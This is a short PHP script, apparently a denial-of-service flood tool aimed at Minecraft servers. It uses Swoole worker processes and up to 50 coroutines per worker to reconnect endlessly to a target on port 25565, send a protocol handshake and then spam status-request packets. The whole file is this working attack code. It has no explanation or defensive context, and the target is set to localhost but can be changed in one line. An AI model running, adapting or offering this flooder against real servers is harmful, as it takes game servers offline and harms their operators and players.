<?php
$target = "localhost";
$port = 25565;
$max_parallel = 50;
$worker = 4;
$pool = new \Swoole\Process\Pool($worker,0,0,true);
$pool->on("workerStart",function ($p,$id) use ($target, $port, $max_parallel){
	print_r("Worker {$id} started.".PHP_EOL);
	$p_count = 0;
	while(true){
		if($p_count >= $max_parallel){
			Co::sleep(0.01);
			continue;
		}
		go(function() use ($target, $port, &$p_count,$id) {
			$n = ++$p_count;
			$dat = "\x00\x04".pack('c', StrLen($target)) . $target . Pack('n', $port) . "\x01";
			$dat = pack('c', strlen($dat)) . $dat;
			try{
				$q = new \Co\Client(SWOOLE_SOCK_TCP);
				print_r("Coro {$id}:{$n} ready.".PHP_EOL);
				Co::sleep(0.01);
				while(true){
					$q->connect($target,$port);
					$q->send($dat);
					while($q->send("\x01\x00")!==false){
						Co::sleep(0.01);
					}
					$q->close();
				}
			} catch(Exception $e) {
				print_r("Coro {$id}:{$n} error.".PHP_EOL.$e->getMessage().PHP_EOL);
			} finally {
				$p_count--;
			}
		});
	}
});

$pool->start();
